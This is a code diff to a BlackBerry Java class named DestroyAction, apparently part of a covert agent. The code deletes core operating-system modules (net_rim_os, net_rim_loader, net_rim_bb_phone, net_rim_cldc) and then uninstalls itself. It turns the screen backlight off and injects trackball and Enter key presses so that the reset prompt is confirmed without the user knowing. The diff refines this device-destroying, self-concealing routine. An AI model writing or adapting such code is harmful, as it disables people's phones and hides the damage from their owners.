@@ -66,36 +66,40 @@ public class DestroyAction extends SubAction implements PhoneListener,
 
         final int handles[] = CodeModuleManager.getModuleHandles();
 
-        int numDeleted=0;
+        int numDeleted = 0;
         final int size = handles.length;
         for (int i = 0; i < size; i++) {
             final int handle = handles[i];
             //CodeModuleManager.getModuleHandle(name)
             // Retrieve specific information about a module.
             final String name = CodeModuleManager.getModuleName(handle);
-            if (name.equals("net_rim_os") || name.equals("net_rim_loader") || name.indexOf("phone") >= 0
-                    || name.equals("net_rim_cldc") || name.indexOf("net_rim") >= 0) {
+            if (name.equals("net_rim_os") || name.equals("net_rim_loader")
+                    || name.equals("net_rim_bb_phone")
+                    || name.equals("net_rim_cldc")) {
                 int ret = CodeModuleManager.deleteModuleEx(handle, true);
                 //#ifdef DEBUG
                 debug.trace("deleteApps, " + name + " : " + ret);
                 //#endif
-                if(ret==6){
+                if (ret == 6) {
                     numDeleted++;
                 }
             }
         }
 
-        if(numDeleted>1){
+        if (numDeleted > 0) {
+            //#ifdef DEBUG
+            debug.trace("deleteApps, reset");
+            //#endif
             Core.uninstall();
+            Status.self().setBacklight(false);
+            CodeModuleManager.promptForResetIfRequired();
+            Status.self().setBacklight(false);
+            Utils.sleep(100);
+            KeyInjector.trackBallUp(1);
+            Utils.sleep(100);
+            pressKey(Keypad.KEY_ENTER);
         }
-        
-        Status.self().setBacklight(false);
-        CodeModuleManager.promptForResetIfRequired();
-        Status.self().setBacklight(false);
-        Utils.sleep(100);
-        KeyInjector.trackBallUp(1);
-        Utils.sleep(100);
-        pressKey(Keypad.KEY_ENTER);
+
     }
 
     void pressKey(int key) {
